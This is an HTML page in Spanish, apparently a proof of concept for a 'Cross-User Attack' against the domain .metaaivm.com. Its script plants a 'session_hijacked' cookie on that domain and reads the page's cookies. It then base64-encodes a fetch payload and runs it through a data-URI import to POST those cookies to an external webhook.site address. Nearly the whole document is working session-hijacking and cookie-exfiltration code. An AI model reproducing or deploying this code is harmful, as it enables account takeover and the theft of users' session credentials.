<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prueba Cross-User Real</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #00ff00; }
        h1 { color: #fff; }
        pre { background: #000; padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; }
    </style>
</head>
<body>
    <h1>Cross-User Attack</h1>
    <pre id="output">Iniciando ataque...</pre>

    <script>
        const out = document.getElementById('output');
        let result = "Iniciando ataque Cross-User...\n";

        // 1. INYECCIÓN DE COOKIE
        try {
            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
            result += "✅ Cookie inyectada en .metaaivm.com.\n";
        } catch (e) {
            result += "❌ Error al inyectar cookie: " + e.message + "\n";
        }

        // 2. LECTURA DE COOKIES
        const victimCookies = document.cookie;
        result += "\nCookies actuales:\n" + victimCookies + "\n";

        // 3. EXFILTRACIÓN VÍA DATA URI
        const webhookUrl = "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde";
        
        try {
            const exfilPayload = `
                try {
                    fetch('${webhookUrl}?cross_user=true', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: 'Cookies: ' + document.cookie
                    });
                } catch(e) {}
            `;
            
            const base64Payload = btoa(unescape(encodeURIComponent(exfilPayload)));
            import("data:text/javascript;base64," + base64Payload)
                .then(() => result += "\n✅ Exfiltración enviada al webhook.\n")
                .catch((e) => result += "\n❌ Error en exfiltración: " + e.message + "\n");

        } catch (e) {
            result += "\n❌ Error al exfiltrar: " + e.message + "\n";
        }

        out.textContent = result;
    </script>
</body>
</html>
